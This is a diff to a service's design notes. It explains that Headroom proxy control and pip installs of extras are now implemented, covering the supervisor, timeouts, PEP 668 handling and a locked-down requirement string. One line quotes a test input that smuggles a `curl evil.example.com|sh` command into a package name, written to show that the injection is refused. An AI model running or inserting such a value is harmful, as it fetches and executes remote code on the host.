@@ -673,11 +673,10 @@ misleading `501`.
 **Refused because this process does not own the subsystem.** No amount of further work in this
 repository implements these; each names the thing it does not own.
 
-- **Headroom process control** — *the Python environment*. Detection is real: it finds a Python ≥ 3.10,
-  asks pip which packages it holds, and reads the install log. Installing extras and starting or
-  restarting the daemon are refused, because this service does not own that interpreter and has no
-  supervisor for a detached daemon. A fake `{"success":true}` here would be the worst available lie —
-  you would believe your prompts were being compressed while being billed for full-size requests.
+(Headroom process control was listed here, on the grounds that this service does not own the Python
+interpreter it discovers and has no supervisor for a detached daemon. The second half was a reason to
+build a supervisor, and the first half was never the requirement — owning an interpreter is not what
+invoking one safely needs. It is now implemented; see below.)
 - **MITM control** (`/api/cli-tools/antigravity-mitm`) — *the intercepting proxy and its certificate
   authority*. URL validation is real. Issuing a CA and rewriting a machine's trust store is not
   something a router should do on a user's behalf.
@@ -911,6 +910,54 @@ able to open a public route into this host, or to enumerate what could be opened
 A missing binary answers 503 naming the program and saying this service will never fetch it, not 501:
 the capability exists and the dependency does not, and a panel has to tell those apart because one is
 fixed by installing something and the other never will be.
+
+**Headroom is started, stopped and installed for real.** `POST /api/headroom/{start,stop,restart}`
+supervise the proxy through the same `procctl` supervisor the tunnels use, and
+`POST`/`DELETE /api/headroom/extras` run `pip` against the interpreter that `GET /api/headroom/extras`
+reports.
+
+This was refused on two grounds, and both were wrong in the same way as the tunnel entry. "No
+supervisor for a detached daemon" was a reason to build one. And "this service does not own the
+interpreter" was never the requirement: what the feature needs is to invoke one safely, which is a
+different thing from owning it. Reading `inspire/src/lib/headroom/process.js` settles what is actually
+involved — `spawn(binary, ["proxy", "--port", …])`, `spawn(py, ["-m", "pip", "install", …])`, a pid
+file, then `SIGTERM` and `SIGKILL` after about three seconds. No `sudo`, no root, no trust store.
+
+Two things here are better than the original rather than equal to it. The pid is held by the
+supervisor instead of a file, so "is it running" cannot be answered by a stale file naming a pid the
+kernel has since reused. And `pip` gets a 15-minute deadline, where upstream waits on it forever — the
+`ml` extra pulls `torch`, and a stalled index otherwise leaves an install hanging with nothing to
+cancel.
+
+One thing is deliberately *not* stricter. Upstream decides the proxy started by waiting eight seconds
+and checking the process is still alive; it never reads the log. An earlier version of this port
+required uvicorn's `Uvicorn running` banner instead — which would fail a start that upstream accepts
+the moment uvicorn rewords its banner, since that line belongs to uvicorn rather than to headroom. The
+rule is now "the banner, or eight seconds of survival, whichever comes first": the banner ends the
+wait early when it appears, and survival is the floor when it does not. A child that dies inside that
+window still fails, which is the half of upstream's check that carries the weight. A test runs a
+stand-in that prints nothing recognisable and asserts it still starts.
+
+The requirement string is the one part of a `pip` invocation a request influences, so it is the part
+that is locked down. `install_spec` builds it from `HEADROOM_COMPRESSION_EXTRAS`, a closed list of two;
+a name outside that list is reported in `ignored` and never reaches `pip`. It then passes the
+requirement charset in `procctl`, which permits `headroom-ai[proxy,code,ml]` and refuses a URL, a path,
+a second requirement, or anything beginning with `-`. A test posts `--index-url=…`,
+`ml];curl evil.example.com|sh;[` and a wheel URL, and asserts the requirement comes out as the
+untouched base.
+
+PEP 668 is its own answer rather than a generic failure. A distribution-managed Python marks itself
+`EXTERNALLY-MANAGED` and `pip` refuses; the exit code is the same `1` it uses for a missing package or
+a broken connection, so the text is what decides, and the response is a 409 naming the fix — a
+virtualenv pointed at by `NULLROUTER_PYTHON`. Reporting that as a retryable failure would send an
+operator round a loop that cannot succeed.
+
+`--code-aware` and kompress come from `HEADROOM_CODE_AWARE` and `HEADROOM_KOMPRESS`, matching
+upstream's `settings.headroomCodeAware === true` and `settings.headroomKompress !== false` — note the
+second defaults to **on**, and inverting it would quietly disable compression everywhere. The
+loopback check keeps its upstream meaning and its upstream 400: a proxy on another host is not ours to
+start. `running` and `healthy` stay separate fields, because a process existing is not the claim that
+the proxy answers.
 
 **Console-log capture is live, across every service.** `/api/translator/console-logs` lists the
 buffered lines, its `/stream` companion pushes new ones as they arrive, and `DELETE` empties the
